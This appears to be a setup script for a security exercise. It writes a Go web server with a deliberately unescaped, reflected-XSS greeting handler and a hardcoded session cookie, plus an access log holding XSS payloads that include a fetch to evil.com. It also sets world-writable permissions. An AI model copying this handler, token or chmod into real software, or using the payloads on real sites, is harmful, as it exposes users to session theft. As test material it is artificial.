#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip golang-go
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    cat << 'EOF' > /home/user/server.go
package main

import (
	"fmt"
	"net/http"
)

func greetHandler(w http.ResponseWriter, r *http.Request) {
	// Set session cookie
	cookie := &http.Cookie{
		Name:  "session_token",
		Value: "abc123xyz",
	}
	http.SetCookie(w, cookie)

	// Get name parameter
	name := r.URL.Query().Get("name")
	if name == "" {
		name = "Guest"
	}

	// Vulnerable response
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprintf(w, "<html><body><h1>Hello, %s!</h1></body></html>", name)
}

func main() {
	http.HandleFunc("/greet", greetHandler)
	http.ListenAndServe(":8080", nil)
}
EOF

    cat << 'EOF' > /home/user/access.log
192.168.1.10 - - [10/Oct/2023:13:55:36 -0700] "GET /greet?name=John HTTP/1.1" 200 123
10.0.0.5 - - [10/Oct/2023:13:56:01 -0700] "GET /greet?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 145
192.168.1.11 - - [10/Oct/2023:13:57:12 -0700] "GET /greet?name=%3cscript%3efetch('http://evil.com')%3c/script%3e HTTP/1.1" 200 156
10.0.0.6 - - [10/Oct/2023:13:58:00 -0700] "GET /greet?name=%3Cscript%3E HTTP/1.1" 403 100
172.16.0.4 - - [10/Oct/2023:13:59:00 -0700] "GET /greet?name=Alice HTTP/1.1" 200 123
10.0.0.5 - - [10/Oct/2023:14:00:00 -0700] "GET /greet?name=%3CSCRIPT%3E HTTP/1.1" 200 145
EOF

    chmod -R 777 /home/user
